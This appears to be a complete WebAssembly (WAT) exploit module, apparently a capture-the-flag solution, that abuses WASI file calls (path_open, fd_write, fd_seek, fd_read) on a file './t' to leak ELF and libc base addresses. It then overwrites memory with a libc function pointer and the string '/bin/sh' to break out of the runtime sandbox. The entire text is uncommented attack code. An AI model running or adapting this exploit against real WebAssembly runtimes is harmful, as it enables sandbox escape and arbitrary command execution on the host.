(module
  (type (;0;) (func))
  (type (;1;) (func (param i32 i32 i32 i32) (result i32)))
  (type (;2;) (func (param i32 i32 i32 i32 i32 i64 i64 i32 i32) (result i32)))
  (type (;3;) (func (param i32 i64 i32 i32) (result i32)))


  (import "wasi_snapshot_preview1" "fd_write" (func $__fd_write (type 1)))
  (import "wasi_snapshot_preview1" "fd_read" (func $__fd_read (type 1)))
  (import "wasi_snapshot_preview1" "path_open" (func $__path_open (type 2)))
  (import "wasi_snapshot_preview1" "fd_seek" (func $__fd_seek (type 3)))
  

  (global $tmp_fd (;0;) (mut i32) (i32.const 0xff))
  (global $elf_base (;0;) (mut i64) (i64.const 0x6666))
  (global $free_addr (;0;) (mut i64) (i64.const 0x1111))
  (global $libc_base (;0;) (mut i64) (i64.const 0x2222))


  (func $_start (type 0)
     i32.const 0
     i32.const 0x742f2e
     i32.store

     i32.const 3
     i32.const 1
     i32.const 0
     i32.const 0x4
     i32.const 0x1
     i64.const 0x4600077
     i64.const 0
     i32.const 0
     i32.const 0
     call $__path_open
     drop
     i32.const 0
     i32.load
     global.set $tmp_fd

     i32.const 0
     i32.const 0x10000
     i32.store
     i32.const 0x4
     i32.const 0xffff
     i32.store

     i32.const 0x100
     i32.const 0
     i32.store

     global.get $tmp_fd
     i32.const 0x0
     i32.const 0x1
     i32.const 0x100
     call $__fd_write
     drop

     global.get $tmp_fd
     i64.const 0x20
     i32.const 0
     i32.const 0
     call $__fd_seek
     drop

     i32.const 0
     i32.const 0
     i32.store
     i32.const 0x4
     i32.const 0x8
     i32.store

     global.get $tmp_fd
     i32.const 0
     i32.const 0x1
     i32.const 0x100
     call $__fd_read
     drop
     i32.const 0
     i64.load
     i64.const 0x29040
     i64.sub
     global.set $elf_base

     i32.const 8
     global.get $elf_base
     i64.const 0x3e520
     i64.add
     i64.store

     i32.const 0x10
     global.get $elf_base
     i64.const 0x8BBD0
     i64.add
     i64.store
     i32.const 0x18
     i64.const 0x62
     i64.store

     global.get $tmp_fd
     i64.const 0
     i32.const 0
     i32.const 0
     call $__fd_seek
     drop

     
     i32.const 0
     i32.const 0x8
     i32.store
     i32.const 0x4
     i32.const 0x18 
     i32.store

     global.get $tmp_fd
     i32.const 0
     i32.const 0x1
     i32.const 0x100
     call $__fd_write
     drop

     global.get $tmp_fd
     i64.const 0
     i32.const 0
     i32.const 0
     call $__fd_seek
     drop

     i32.const 0
     i32.const 0x107e0
     i32.store
     i32.const 0x4
     i32.const 0x18
     i32.store

     global.get $tmp_fd
     i32.const 0
     i32.const 0x1
     i32.const 0x100
     call $__fd_read
     drop

     global.get $free_addr
     i64.const 0x97910
     i64.sub
     global.set $libc_base

     i32.const 8
     global.get $libc_base
     i64.const 0x4F420
     i64.add
     i64.store

     i32.const 0x10
     i64.const 0x68732f6e69622f
     i64.store

     global.get $tmp_fd
     i64.const 0
     i32.const 0
     i32.const 0
     call $__fd_seek
     drop

     i32.const 0
     i32.const 0x8
     i32.store
     i32.const 0x4
     i32.const 0x10
     i32.store

     global.get $tmp_fd
     i32.const 0
     i32.const 0x1
     i32.const 0x100
     call $__fd_write
     drop

     global.get $tmp_fd
     i64.const 0
     i32.const 0
     i32.const 0
     call $__fd_seek
     drop

     i32.const 0
     i32.const 0x10b48
     i32.store
     i32.const 0x4
     i32.const 0x10
     i32.store

     global.get $tmp_fd
     i32.const 0
     i32.const 0x1
     i32.const 0x100
     call $__fd_read
     drop

  )
  (memory (;0;) 0x1)
  (export "_start" (func $_start))
)
